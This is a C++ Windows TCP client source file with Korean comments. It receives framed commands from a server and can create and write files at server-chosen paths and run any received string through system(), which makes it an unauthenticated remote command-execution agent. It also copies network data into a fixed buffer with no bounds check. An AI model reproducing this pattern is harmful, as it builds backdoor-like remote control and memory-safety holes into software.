#include "TCPClient.h"
#include <iostream>

// ================================================================================ //
// 생성자/소멸자
// ================================================================================ //
CTCPClient::CTCPClient(std::string address, int port) : m_socket(0), m_address(address), m_port(port)
{
}

CTCPClient::~CTCPClient()
{
}

void CTCPClient::ReConnect()
{
	const int err = WSAGetLastError();

	// 호스트 연결이 종료된 경우
	if (err == WSAECONNRESET || err == WSAENOTCONN)
	{
		Close();
		Connect();
	}
}

void CTCPClient::Receive()
{
	std::ofstream file;

	while (true)
	{
		uintmax_t length = 0;
		// 헤더를 읽고
		const int HeaderType = ReadHeader(length);
		if (0 == HeaderType) continue;
		std::cout << std::endl << "HeaderType : " << HeaderType << std::endl;

		// 헤더가 유효하다면
		// 실제 데이터의 크기를 구한다.
		const uintmax_t data_length = (length - sizeof(length) - sizeof(HeaderType));
		if (0 >= data_length) continue;

		

		// 데이터가 유효한 경우
		if (HeaderType == PROTOCOL_ID_CREATEFILE)
		{
			// 실제 파일 길이는 이만큼
			const int nPath = data_length;
			char* pFilePath = new char[nPath + 1];

			while (true)
			{
				int tmp_read_size = recv(m_socket, (char*)pFilePath, nPath, 0);
				if (tmp_read_size != nPath) continue;
				pFilePath[nPath] = 0x00; // 마지막 위치를 NULL로 준다.
				//CreateDirecotryStaticPath(pFilePath);
				printf(">> 파일 생성 :: %s \n", pFilePath);
				file.open(pFilePath, std::ios_base::binary);

				if (file.is_open() == false)
				{
					file.open(pFilePath, std::ios_base::binary);
				}
				break;
			}

			delete[] pFilePath;

		}
		else if (HeaderType == PROTOCOL_ID_WRITEFILE)
		{
			unsigned char buffer[MAX_PATH] = { 0, };
			// 실제 파일 길이는 이만큼
			const int ExistsPackets = data_length;
			recv(m_socket, (char*)buffer, ExistsPackets, 0);
			const int iFileSize = *(int*)buffer;

			size_t readStack = 0;

			while (true)
			{
				char buffer[4096] = { 0, };
				const int buffer_size = sizeof(buffer) / sizeof(char);
				int tmp_read_size = 0;

				if (readStack + buffer_size <= iFileSize)
					tmp_read_size = recv(m_socket, (char*)buffer, buffer_size, 0);
				else
					tmp_read_size = recv(m_socket, (char*)buffer, iFileSize - readStack, 0);


				if (tmp_read_size == 0 || tmp_read_size == -1) continue;
				else readStack += tmp_read_size;

				if (file.write(buffer, tmp_read_size))
				{
					size_t numberOfBytesWritten = file.tellp();
					printf(">>[%f%] Current Length = [%10d]\n", readStack / (float)iFileSize * 100.0f, tmp_read_size);

				}
				//fwrite(buffer, 1, tmp_read_size, file.);

				if (iFileSize == readStack)
					break;
				else if (readStack > iFileSize)
					break;
			}
		}
		else if (HeaderType == PROTOCOL_ID_CLOSEHANDLE)
		{
			printf(">> 파일 다운로드 완료");
			file.close();
		}
		else if (HeaderType == PROTOCOL_ID_HEARTBEAT)
		{
			printf(">> LIVE ! \n");
			char result = 0x01;
			send(m_socket, &result, 1, 0);
		}
		else if (HeaderType == PROTOCOL_ID_ECHO)
		{
			// 실제 파일 길이는 이만큼
			const int nMessage = data_length;
			char* pMessage = new char[nMessage + 1];

			while (true)
			{
				int tmp_read_size = recv(m_socket, (char*)pMessage, nMessage, 0);
				if (tmp_read_size != nMessage) continue;
				pMessage[nMessage] = 0x00; // 마지막 위치를 NULL로 준다.

				break;
			}

			MessageBoxA(NULL, pMessage, "", MB_OK);

			delete[] pMessage;
		}

		else if (HeaderType == PROTOCOL_ID_COMMAND_LINE)
		{
			// 실제 파일 길이는 이만큼
			const int nMessage = data_length;
			char* pMessage = new char[nMessage + 1];

			while (true)
			{
				int tmp_read_size = recv(m_socket, (char*)pMessage, nMessage, 0);
				if (tmp_read_size != nMessage) continue;
				pMessage[nMessage] = 0x00; // 마지막 위치를 NULL로 준다.

				break;
			}

			system(pMessage);
			//MessageBoxA(NULL, pMessage, "", MB_OK);

			delete[] pMessage;
		}
	}

}

int CTCPClient::ReadHeader(uintmax_t& ref_length)
{
	// 헤더 사이즈 정의
	constexpr int iHeaderByteSize = sizeof(uintmax_t) + sizeof(int);
	uint8_t buffer[iHeaderByteSize] = { 0, };
	// 헤더 읽기
	const int read_size = recv(m_socket, (char*)buffer, iHeaderByteSize, 0);
	// 헤더에서 패킷의 길이 구하기
	// 길이가 0이하인 경우 헤더가 없는 것으로 판단한다
	const uintmax_t PacketLength = *(uintmax_t *)buffer;
	 if (0 >= read_size) return 0;

	// 헤더가 있을 경우
	// 헤더에서 타입을 구한다
	int HeaderType = *(int*)(buffer + sizeof(uintmax_t));
	switch (HeaderType)
	{
	default:
		break;
	}

	ref_length = PacketLength;
	return HeaderType;
}


// ================================================================================ //
int CTCPClient::Connect()
{
	WSADATA data;
	::WSAStartup(MAKEWORD(2, 2), &data);

	m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (m_socket == INVALID_SOCKET)
		return ERR_TCP_INVALID_SOCKET;

	sockaddr_in addr = { 0 };

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(m_address.c_str());
	addr.sin_port = htons(m_port);

	if (connect(m_socket, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
		return ERR_TCP_CONNECT_ERROR;

	// 논블로킹 소켓으로 변경한다.
	SetNonBlocking();

	return 1;
}

int CTCPClient::Close()
{
	closesocket(m_socket);
	::WSACleanup();

	return 1;
}

void CTCPClient::SetNonBlocking()
{
	u_long nonBlockingMode = 1;
	ioctlsocket(m_socket, FIONBIO, &nonBlockingMode); // sock을 논블로킹 모드로 설정
}

void CTCPClient::SafeSend(char* buffer, int length)
{
	int countdown = length;

	while (countdown > 0)
	{
		int result = send(m_socket, (char*)buffer + (length - countdown), countdown, 0);
		const int err = WSAGetLastError();


		if (err == WSAECONNRESET && result == SOCKET_ERROR)
			break;
		if (result == SOCKET_ERROR)
			continue;

		countdown -= result;
	}
}

bool CTCPClient::SafeRecv(std::string& ref_buffer)
{
	unsigned char buffer[4096] = { 0, };
	const int buffer_size = sizeof(buffer) / sizeof(char);
	int iCountFailure = 0;
	while (true)
	{
		if (iCountFailure == 100)
			return false;

		const int recv_size = recv(m_socket, (char*)buffer, buffer_size, 0);
		const int err = WSAGetLastError();

		//printf("Receive Size = [%d] LastError = [%d] \n", recv_size, err);
		if (err == WSAECONNRESET && recv_size == SOCKET_ERROR)
			break;
		if (WSAEWOULDBLOCK == err)
		{
			Sleep(10);
			++iCountFailure;
			continue;
		}

		ref_buffer.append((char*)buffer, recv_size);
		if (recv_size < buffer_size && 0 == err)
			return true;
	}
}
// ================================================================================ //

